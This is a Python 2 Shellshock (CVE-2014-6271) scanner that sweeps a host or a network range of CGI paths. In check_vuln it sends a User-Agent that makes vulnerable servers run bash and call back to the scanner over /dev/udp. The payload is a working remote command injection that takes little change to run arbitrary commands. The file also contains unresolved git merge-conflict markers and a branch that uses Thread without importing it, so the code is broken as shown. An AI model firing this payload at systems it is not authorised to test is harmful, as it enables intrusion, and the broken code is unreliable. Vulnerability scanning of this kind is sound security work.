#!/bin/python
# -*- coding: utf-8 -*-

'''This script will attempt to identify possible vulnerable CGI scripts on a server

The test is performed by sending a maliciously crafted User-Agent that will instruct 
the vulnerable machine to echo the URL you are testing back to your system on a port of your choice.
 
***This requires that the machine you are testing be able to connect back to you;
either via a local network, Public IP, or NAT***

Written by Francisco Donoso https://github.com/francisck
'''



import socket, sys
import argparse
import urllib2
from multiprocessing import Process
from netaddr import IPNetwork
from time import sleep

def parse_args():
    p = argparse.ArgumentParser(description='''Shellshock CGI vulnerably test''', 
    formatter_class=argparse.RawTextHelpFormatter)

    p.add_argument('-s', '--server', help="The IP address or URL of the system you are trying to test no leading HTTP://")
    p.add_argument('-n', '--network', help="Enter a network to scan in CDIR notation")
    p.add_argument('-l', '--listen', required=True, help="The interface IP address that should listen on your system")
    p.add_argument('-p', '--port', default=4443, type=int, help="The port to listen on for the callback")
        
    args = p.parse_args()
    if not (args.server or args.network):
		p.error("You didn't enter a server or network to scan. add -s or -n and try agian")
    return args
        
        
args = parse_args() 
host = args.listen
port = args.port
if args.network != None:
	network = args.network
	network = list(IPNetwork(network))
	scan_cidr = True
if args.server != None:
	server_clean = args.server
	server = server_clean.replace("http://","")
	server_ip = socket.gethostbyname(server)

def test_socket():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		# Set the socket to non-blocking in order to facilitate recvfrom interruption.
		s.setblocking(0)
	except socket.error:
		print 'Unable to create a socket.'
		sys.exit()

	try:
		s.bind((host,port))
	except socket.error:
		print "Error binding to the socket."
		sys.exit()
	
	print '[+] Testing %s' %(ip)
	check_vuln()
	while True:
		try:
			data, respond_server = s.recvfrom(4096)
			if respond_server[0] == str(ip): #verify that the server responding is the same as the server we are testing
				print "[X] The server is vulnerable at the following URI: %s" %(data)
		except socket.error:
			# Socket is set to non-blocking. Errors at no-data. 
			pass


def check_vuln():
	CGI_Scripts = open('cgiscripts.txt','r') #This is a list of possibly vulnerable CGI scripts. Will add more as I find them. 
#Most of these paths are from http://shellshock.detectify.com
	for uri in CGI_Scripts:
		#print "Scanning %s for CVE-2014-6271" % TEST
		server_test = "http://"+str(TEST)+str(uri)
		#print server_test
		#print "checked %s for vuln" % server_test
		usr_agent = "() { :;}; /bin/bash -c 'echo %s > /dev/udp/%s/%s'" %(server_test,host,port) #create a custom user-agent. 
		#It echos the URI we are testing back via UDP to the host and port we specified (the machine you are running the code from)
		try:
			req = urllib2.Request(server_test, None, {"User-agent" : usr_agent})
			urllib2.urlopen(req,None,1)
		except (urllib2.HTTPError, urllib2.URLError) as e: # a lot of the URLS we test are going to be 404s lets ignore those errors
			pass
<<<<<<< HEAD
	CGI_Scripts.close()

def test(number):
	global ip
	ip = number
	global TEST
	TEST = number
	t1 = Process(target = test_socket)
	try: # Need to spin up a thread to keep our socket open while we test URLs
		t1.daemon = True
		t1.start()
		sleep(1)
	except KeyboardInterrupt: #want to make sure this is interruptible 
		t1.terminate()
		sys.exit()
	finally:
		t1.terminate()

print '[+] Listening for incoming connections on the following socket' + " " + str(host) + ":" + str(port)
for each in network:
	test(each)


=======

def main():
	try: # Need to spin up a thread to keep our socket open while we test URLs
		t1 = Thread(target = test_socket)
		t1.daemon = True
		t1.start()
		check_vuln()
	except KeyboardInterrupt: #want to make sure this is interruptible 
		t1._Thread__stop()
		sys.exit()
	finally:
		t1._Thread__stop()
		sys.exit()
		
if __name__ == "__main__":
	main()
>>>>>>> FETCH_HEAD
